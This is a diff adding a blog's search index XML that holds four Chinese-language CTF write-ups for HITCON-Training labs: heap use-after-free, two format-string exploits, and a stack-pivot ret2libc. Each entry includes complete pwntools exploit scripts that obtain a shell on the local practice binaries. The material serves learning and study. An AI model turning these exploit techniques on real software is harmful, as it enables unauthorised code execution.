@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+    <entry>
+      <title><![CDATA[lab10_hacknote]]></title>
+      <url>/hitcon_trainning/2019/07/13/hacknote/</url>
+      <content type="text"><![CDATA[堆漏洞-UAF全称 use after free，是在free之后指针没有置NULL留下的漏洞。这就导致之前的指针还可以控制这块内存。这道题利用的是内存分配机制的fastbins。fastbinsfastbins也是一个bins，和smallbins和unsortbins不同的是，放入其中的chunk使用标志位P不会被置0，在非特定场合下是不会触发合并操作的。  小于max_fast（默认是64B）的chunk都会被放到其中，使用时为  精确匹配、先进后出思路本来就是打pwn苦手，搞堆真的更加难受[留下心酸泪水]这道题做第二次了，寒假集训的时候也做了。但谁能想到，第二次做的时候仍旧是较为懵逼。  这道题在ctfwiki上有详细解释。这道题里面，notelist中每一个元素大小是8B，前4B是一个打印函数地址，后4B是用来存放content的地址。 ps:以下都没有考虑chunk的控制域大小 在申请notelist[0]、notelist[1]，content的大小不为8B就可以， [chunk会自动对齐到8B,所以不能比8B小] 之后del，fastbins中8B的bin中就有了两个chunk。申请notelist[2]时将content的大小设置为8，那么在分配的时候，notelist[1]原本的chunk给了notelist[2],notelist[0]原本的chunk给了notelist[2]的content。所以就可以控制notelist[0]的打印函数地址。expfrom pwn import *context.log_level = 'debug'context.terminal = ['deepin-terminal','-x','sh','c']sh = process('./hacknote')elf = ELF('./hacknote')magic_addr=elf.symbols['magic']#gdb.attach(sh)def add_note(sz,content):    sh.sendlineafter('choice :','1')    sh.sendlineafter('size :',str(sz))    sh.sendlineafter('Content :',content)def del_note(index):    sh.sendlineafter('choice :','2')    sh.sendlineafter('Index :',str(index))def print_note(index):    sh.sendlineafter('choice :','3')    sh.sendlineafter('Index :',str(index))add_note(16,'aaaa')add_note(16,'aaaa')del_note(0)del_note(1)payload = p32(magic_addr)add_note(8,payload)print_note(0)sh.interactive()sh.close()]]></content>
+      <categories>
+        
+          <category> hitcon_trainning </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> heap </tag>
+        
+          <tag> uaf </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+    <entry>
+      <title><![CDATA[lab9_playfmt]]></title>
+      <url>/hitcon_trainning/2019/07/11/playfmt/</url>
+      <content type="text"><![CDATA[格式化字符串漏洞格式化字符串漏洞的两个利用方式  泄露栈上内容  改写某地址内容（前提是这个地址要在栈上，也就是printf可控的地方）原理是用格式化字符串对栈上的相对而言的参数进行解析。  如果用的%k$p、%k$x等就是打印出来相对printf的第几个参数；%s可以打印栈上地址指向的内容（等会用这个打印printf@got），也可以用来破坏程序；%n可以向地址类参数指向的地方写入内容。思路一开始就是没有思路，太菜了，真的太菜了TAT。这里的buf是在bss段，也就是意味着没有办法用常规方法做。看了大佬的wp才知道可以控制ebp来实现地址任意写。但是我觉得或许用栈迁移也可以试一下。先写一波控制ebp！为什么buf在bss段就没法用常规方法？  常规方法是利用栈上内容可写，将其写为某个地址，然后用%k$n这样的方式把这个地址指向的内容改掉。 而现在buf没法通过直接写入来控制栈上的地址。控制ebp现在关键是要找到栈上哪些位置里面的内容是地址而且是可以控制栈上别的位置的内容的，以此来写入我们的目的地址。这个地方就是ebp。ebp本来就是用来保存之前的ebp的内容。比如我们设想一个情况：  ebp_1是相对printf的第6个参数，里面存着ebp_2的地址;  ebp_2是相对printf的第10个参数;  格式化字符串漏洞就可以通过 %6$n改写ebp_2指向别的地方。改写过后，ebp_2内就是栈上另外位置的地址，我们假设他是fmt_7，是相对于printf的第7个参数。  %10$n 就可以让fmt_7指向printf@got。  %7$s 就可以打印出printf@got的内容从而计算出system的真实地址。 用 %7$n就可以直接改写printf@got为system的地址，接下来再调用printf就是调用system了。但是有一个问题，%k$n一用就炸，也就是说我们起码要用hn，在找fmt_7的时候要求其内容的前两个字节和got表的前两个字节是相同的。并且在改写printf@got的时候，至少要把它分为两次写进去，那么我们就还要有一个地方指向printf@got+2，这个地址的要求和fmt_7是一样的。expfrom pwn import *context.log_level='debug'context.terminal = ['deepin-terminal', '-x', 'sh', '-c']sh = process('./playfmt')elf = ELF('./playfmt')libc = elf.libc#gdb.attach(sh)#-----------------address prepare----------------printf_got = elf.got['printf']printf_libc = libc.symbols['printf']system_libc = libc.symbols['system']sh.recv()sh.sendline('%6$x')ebp_2 = int(sh.recv(),16)fmt_7 = ebp_2-0xcfmt_11 = ebp_2+0x4ebp_1 = fmt_7-0x4#-----------------ebp_2--&gt;fmt_7--------------------payload = '%'+str(fmt_7 &amp; 0xffff)+'c%6$hn\x00'sh.sendline(payload)sleep(0.3)'''这里的一段while，是因为%kc输出的实在太多了recv()每次只能接受0x1000的内容如果没有循环的话会卡住。用一个标识符做接受完成标志至于为什么这里每次都要sendline('yes!')因为他可能前面的输出加上'ye'刚好就是0x100,后面就会因为只有's!'而没法跳出循环，就卡死了[↑血的教训=皿=]sleep(0.1)是两个sendline之间的常规操作来应对玄学问题[我猜的]。'''sh.sendline('yes!')while True:    sh.sendline('yes!')    sleep(0.1)    if sh.recv().find('yes!') != -1:        break#-----------------fmt_7--&gt;printf@got----------------payload = '%' + str(printf_got &amp; 0xffff)+'c%10$hn\x00'sh.sendline(payload)sleep(0.3)sh.sendline('yes!')while True:    sh.sendline('yes!')    sleep(0.1)    if sh.recv().find('yes!') != -1:        break#-----------------ebp_2--&gt;fmt_11--------------------payload = '%' + str(fmt_11 &amp; 0xffff) + 'c%6$hn\x00'sh.sendline(payload)sleep(0.3)sh.sendline('yes!')while True:    sh.sendline('yes!')    sleep(0.1)    if sh.recv().find('yes!') != -1:        break#-----------------fmt_11--&gt;printf@got+2---------------payload = '%' + str((printf_got+2) &amp; 0xffff) +'c%10$hn\x00'sh.sendline(payload)sleep(0.3)sh.sendline('yes!')while True:    sh.sendline('yes!')    sleep(0.1)    if sh.recv().find('yes!') != -1:        break#-----------------calculate system address-------------sh.sendline('%7$s')printf_elf = u32(sh.recv(4))system_elf = printf_elf-printf_libc+system_libclog.info('************{:#x}***********'.format(system_elf))#----------------change global offset table------------addr_1 = system_elf &amp; 0xffffaddr_2 = system_elf&gt;&gt;16'''这里是防止addr_2比addr_1小嘻嘻，从师傅那里偷学的方法=v='''ls=[0,addr_1,addr_2]ls.sort()lis={0:0,addr_1:7,addr_2:11}payload=''for i in range(1,3):    payload += '%' + str(ls[i]-ls[i-1]) + 'c%' + str(lis[ls[i]]) + '$n'payload += '\x00'log.info('************{}***********'.format(payload))sh.sendline(payload)sleep(0.3)sh.sendline('yes!')while True:    sh.sendline('yes!')    sleep(0.1)    if sh.recv().find('yes!') != -1:        breaksleep(0.1)sh.sendline('/bin/sh')sh.interactive()sh.close()栈迁移这个思路按理是可以的，把do_fmt的返回地址改成read的，按照常规栈迁移的套路来，然后用read做栈溢出，输入quit就可以开始栈迁移。但是ebp_1怎么变是一个问题，%k$n的输出太长了会炸是另一个问题，好麻烦啊。不想写了。【可能这就是我咸鱼的原因。】]]></content>
+      <categories>
+        
+          <category> hitcon_trainning </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> stack </tag>
+        
+          <tag> formating_string </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+    <entry>
+      <title><![CDATA[lab7_crack]]></title>
+      <url>/hitcon_trainning/2019/07/11/crack/</url>
+      <content type="text"><![CDATA[格式化字符串漏洞非getshell思路  按代码的逻辑来说，是要求猜一个随机数，如果这里的cat flag的确有这个flag的话，那么覆盖password成为指定内容就可以做完了。password是一个bss段的变量，而checksec发现地址随机化没开，所以password的地址确定了。       **payload**    buf是第十个参数,干脆把他覆盖成0。然后再加上前面格式化字符串的长度，可以得到地址开始是第17个参数。    payload="%17$hhn%18$hhn%19$hhn%20$hhnA"+p32(0x0804a048)+p32(0x0804a049)+p32(0x0804a050)+p32(0x0804a051)      expfrom pwn import *import time #context.terminal = ['deepin-terminal', '-x', 'sh', '-c']sh=process("./crack")context.log_level='debug'#gdb.attach(sh)payload="%17$hhn%18$hhn%19$hhn%20$hhn"+p32(0x0804a048)+p32(0x0804a049)+p32(0x0804a04a)+p32(0x0804a04b)sh.sendlineafter("name ? ",payload)time.sleep(0.1)sh.sendlineafter(':','0')sh.interactive()sh.close()getshell  我大胆想象一下，如果我把atoi的got表给改成system的plt表……from pwn import *import time #context.terminal = ['deepin-terminal', '-x', 'sh', '-c']sh=process("./crack")elf=ELF("./crack")context.log_level='debug'#gdb.attach(sh)atoi_got_addr=elf.got['atoi']system_plt_addr=elf.plt['system']payload=fmtstr_payload(10,{atoi_got_addr:system_plt_addr})sh.sendlineafter('? ',payload)time.sleep(0.1)sh.sendlineafter(':',"/bin/sh")sh.interactive()sh.close()plt表是不可写的= =。 ]]></content>
+      <categories>
+        
+          <category> hitcon_trainning </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> stack </tag>
+        
+          <tag> formating_string </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+    <entry>
+      <title><![CDATA[lab6_migration]]></title>
+      <url>/hitcon_trainning/2019/07/11/migration/</url>
+      <content type="text"><![CDATA[ 栈溢出——栈迁移错误思路漏洞栈溢出这里的buf溢出了0x40-0x28 个字节checksec比较友好，没有开地址随机化。解决是一个ret2libc的题目，返回到puts打印libc_start_main的got表地址，确定libc的版本。这里有一个问题就是我不知道这个count如果在我返回到libc_start_main的话是不是会被初始化，我先试一下。然后计算system和/bin/sh， 返回到这里。不行。因为这个libc的基址是后面计算才知道的，没法提前就写进去。正确不是这么搞的= =，好累。正确的思路是栈迁移。漏洞还是栈溢出啊。判断是栈迁移的原因有几点    1. 因为count那个地方其实是一个hint，告诉你ret2libc是行不通的。    2. 能够构造成payload的长度是0x40-0x28其实只有0x18太短了。    3. 因为system的地址是算出来的，所以要多次输入，也就是多次返回到read，但是不能直接返回到main函数里面，所以说需要直接返回到read，并且多次通过read再一次栈溢出控制程序流程，所以需要控制栈的地址。但是实在程序加载的时候你是没法确定栈地址的[反正我现在不可以确定]，于是就是栈迁移！思路栈迁移的基本思路是用leave；ret；leave;ret;mov %ebp,%esppop %ebppop %eip这样就可以把esp劫持走。这道题可以把栈迁移到bss。权限和大小是够的。过程  第一次系统自带的read栈溢出需要打印基址以及实现栈迁移。选择bss段一个中间位置，瞎选一个bss+0x500栈的构造应该是    esp junk data ......ebp bss+0x500 put_plt pop1ret libc_start_main_got read_plt leave_ret 0 bss+0x500 0x100    第二次的栈溢出需要输入/bin/sh，然后执行system。栈的构造是esp/ebp bss+0x400        read_plt        pop3ret        0        bss+0x400        0x100        system_addr        0xdeadbeef        bss+0x400(bin_sh_addr)pop1ret和pop3ret：错误： 第一次不能实现这么多功能，他只有0x18个数据，payload长度超了。所以要把他分成两次  第一次esp junk data    ... ...ebp bss+0x500    read_plt    leave_ret    0    bss+0x500    0x100  第二次esp/ebp bss+0x400        put_plt        pop1ret        libc_start_main_got        read_plt        leave_ret        0        bss+0x400        0x100  第三次esp/ebp bss+0x500        read_plt        pop3ret        0        bss+0x500        0x100        system_addr        0xdeadbeef        bss+0x500expfrom pwn import *from LibcSearcher import *context.log_level='debug'sh=process('./migration')elf=ELF("./migration")pause()libc_start_main_got=elf.got['__libc_start_main']puts_plt=elf.plt['puts']read_plt=elf.plt['read']bss_addr=elf.bss()pop1ret=0x0804836dpop3ret=0x08048569leave_ret=0x08048418offset=0x28#------------move stack-----------payload=flat(['A'*offset,bss_addr+0x500,read_plt,leave_ret,0,bss_addr+0x500,0x100])sh.sendafter("best :\n",payload)#-----------leak libc base-------payload=flat([bss_addr+0x400,puts_plt,pop1ret,libc_start_main_got,read_plt,leave_ret,0,bss_addr+0x400,0x100])sh.send(payload)libc_start_main_addr=u32(sh.recv()[0:4])print 'libc_start_main_got----------&gt;{:x}'.format(libc_start_main_addr)libc=LibcSearcher('__libc_start_main',libc_start_main_addr)libcbase=libc_start_main_addr-libc.dump('__libc_start_main')system_addr=libcbase+libc.dump('system')print 'system-----------------------&gt;{:x}'.format(system_addr)#---------get shell---------------payload=flat([bss_addr+0x500,read_plt,pop3ret,0,bss_addr+0x500,0x100,system_addr,0xdeadbeef,bss_addr+0x500])sh.send(payload)sh.send('/bin/sh\x00')sh.interactive()sh.close()后记本来想用libcsearch找/bin/sh的地址直接返回，但是谁能想到他太不争气了，和本机的libc版本不同导致不知道找了个啥东西，也不知道system是怎么找对的。还被师傅骂一通TAT还diss我代码写的丑TAT这里有一个trick，libc=elf.libc,然后就不用导入libc了。from pwn import *context.log_level = 'debug'sh = process('./migration')elf = ELF("./migration")libc = elf.libccontext.binary = "./migration"libc_start_main_got = elf.got['__libc_start_main']puts_plt = elf.plt['puts']read_plt = elf.plt['read']bss_addr = elf.bss()pop1ret = 0x0804836dpop3ret = 0x08048569leave_ret = 0x08048418offset = 0x28#------------move stack-----------payload=flat(['A'*offset,bss_addr+0x500,read_plt,leave_ret,0,bss_addr+0x500,0x100])sh.sendafter("best :\n",payload)#-----------leak libc base-------payload=flat([bss_addr+0x400,puts_plt,pop1ret,libc_start_main_got,read_plt,leave_ret,0,bss_addr+0x400,0x100])sh.send(payload)libc_start_main_addr=u32(sh.recvn(4))print 'libc_start_main_addr----------&gt;{:x}'.format(libc_start_main_addr)libc.address = libc_start_main_addr - libc.sym['__libc_start_main']system_addr=libc.sym['system']bin_sh_addr=libc.search('/bin/sh').next()# pause()print 'system-----------------------&gt;{:x}'.format(system_addr)#---------get shell---------------payload=flat([bss_addr+0x500,system_addr,0xdeadbeef,bin_sh_addr])sh.send(payload)sh.interactive()sh.close()]]></content>
+      <categories>
+        
+          <category> hitcon_trainning </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> stack </tag>
+        
+          <tag> leave_stack </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+</search>
